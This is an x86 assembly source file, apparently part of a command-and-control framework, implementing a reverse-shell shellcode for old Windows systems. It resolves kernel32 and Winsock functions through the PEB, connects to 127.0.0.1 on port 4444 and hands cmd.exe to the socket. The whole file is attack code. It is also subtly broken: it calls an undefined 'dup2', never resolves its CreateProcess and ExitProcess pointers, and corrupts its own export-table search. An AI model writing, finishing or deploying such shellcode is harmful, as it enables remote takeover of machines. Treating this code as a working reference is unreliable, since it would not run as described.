; Cardinal C2 Framework - Shellcode Component
; Target: Windows XP/2000/95/Server 2003/2008
; Architecture: x86 (32-bit)
;
; This is a position-independent reverse shell shellcode

BITS 32

global _start

_start:
    ; Save registers
    pushad
    
    ; Get kernel32.dll base address using PEB
    xor eax, eax
    mov eax, [fs:0x30]          ; PEB
    mov eax, [eax + 0x0C]       ; PEB->Ldr
    mov eax, [eax + 0x14]       ; InMemoryOrderModuleList
    mov eax, [eax]              ; Second module (kernel32.dll)
    mov eax, [eax]              ; Third module
    mov eax, [eax + 0x10]       ; DllBase
    mov [kernel32_base], eax
    
    ; Find LoadLibraryA
    push eax
    mov eax, [eax + 0x3C]       ; PE header offset
    mov ebx, [kernel32_base]
    add eax, ebx
    mov eax, [eax + 0x78]       ; Export table RVA
    add eax, ebx
    
    ; Get address of functions
    mov ecx, [eax + 0x18]       ; Number of functions
    mov edi, [eax + 0x20]       ; AddressOfNames RVA
    add edi, ebx
    
find_loadlibrary:
    dec ecx
    mov esi, [edi + ecx * 4]
    add esi, ebx
    
    ; Compare with "LoadLibraryA"
    push ecx
    xor ecx, ecx
    mov cl, 12
    lea edi, [loadlibrary_str]
    repe cmpsb
    pop ecx
    jnz find_loadlibrary
    
    ; Found LoadLibraryA
    mov esi, [eax + 0x24]       ; AddressOfNameOrdinals
    add esi, ebx
    mov cx, [esi + ecx * 2]
    mov esi, [eax + 0x1C]       ; AddressOfFunctions
    add esi, ebx
    mov eax, [esi + ecx * 4]
    add eax, ebx
    mov [loadlibrary_addr], eax
    
    ; Load ws2_32.dll
    lea eax, [ws2_32_str]
    push eax
    call [loadlibrary_addr]
    mov [ws2_32_base], eax
    
    ; Find WSAStartup
    push eax
    lea eax, [wsastartup_str]
    push eax
    push [ws2_32_base]
    call get_proc_address
    mov [wsastartup_addr], eax
    
    ; Find WSASocketA
    lea eax, [wsasocket_str]
    push eax
    push [ws2_32_base]
    call get_proc_address
    mov [wsasocket_addr], eax
    
    ; Find connect
    lea eax, [connect_str]
    push eax
    push [ws2_32_base]
    call get_proc_address
    mov [connect_addr], eax
    
    ; Initialize Winsock
    xor eax, eax
    push eax
    push eax
    push esp
    push 0x0202
    call [wsastartup_addr]
    
    ; Create socket
    xor eax, eax
    push eax                    ; protocol
    push eax                    ; type
    push 0x02                   ; af (AF_INET)
    call [wsasocket_addr]
    mov [sock], eax
    
    ; Setup sockaddr_in structure
    push 0x0100007F             ; IP: 127.0.0.1 (reverse byte order)
    push word 0x5C11            ; Port: 4444 (reverse byte order)
    push word 0x02              ; AF_INET
    mov esi, esp
    
    ; Connect
    push 0x10                   ; sizeof(sockaddr_in)
    push esi                    ; sockaddr_in
    push [sock]                 ; socket
    call [connect_addr]
    
    ; Redirect stdin, stdout, stderr to socket
    xor ecx, ecx
    mov cl, 3
    
redirect_loop:
    dec ecx
    push ecx
    push [sock]
    push ecx
    call dup2
    pop ecx
    test ecx, ecx
    jnz redirect_loop
    
    ; Execute cmd.exe
    xor eax, eax
    push eax
    lea eax, [cmd_str]
    push eax
    call [createprocess_addr]
    
    ; Exit
    xor eax, eax
    push eax
    call [exitprocess_addr]

get_proc_address:
    push ebp
    mov ebp, esp
    push ebx
    push esi
    push edi
    
    mov ebx, [ebp + 8]          ; Module base
    mov edi, [ebp + 12]         ; Function name
    
    mov eax, [ebx + 0x3C]
    add eax, ebx
    mov eax, [eax + 0x78]
    add eax, ebx
    
    mov ecx, [eax + 0x18]
    mov esi, [eax + 0x20]
    add esi, ebx
    
gpa_loop:
    dec ecx
    mov edx, [esi + ecx * 4]
    add edx, ebx
    
    push ecx
    push esi
    mov esi, edx
    xor ecx, ecx
    
gpa_compare:
    lodsb
    cmp al, [edi + ecx]
    jne gpa_next
    test al, al
    jz gpa_found
    inc ecx
    jmp gpa_compare
    
gpa_next:
    pop esi
    pop ecx
    test ecx, ecx
    jnz gpa_loop
    xor eax, eax
    jmp gpa_end
    
gpa_found:
    pop esi
    pop ecx
    mov esi, [eax + 0x24]
    add esi, ebx
    mov cx, [esi + ecx * 2]
    mov esi, [eax + 0x1C]
    add esi, ebx
    mov eax, [esi + ecx * 4]
    add eax, ebx
    
gpa_end:
    pop edi
    pop esi
    pop ebx
    pop ebp
    ret 8

; Data section
kernel32_base: dd 0
loadlibrary_addr: dd 0
ws2_32_base: dd 0
wsastartup_addr: dd 0
wsasocket_addr: dd 0
connect_addr: dd 0
createprocess_addr: dd 0
exitprocess_addr: dd 0
sock: dd 0

loadlibrary_str: db "LoadLibraryA", 0
ws2_32_str: db "ws2_32.dll", 0
wsastartup_str: db "WSAStartup", 0
wsasocket_str: db "WSASocketA", 0
connect_str: db "connect", 0
cmd_str: db "cmd.exe", 0
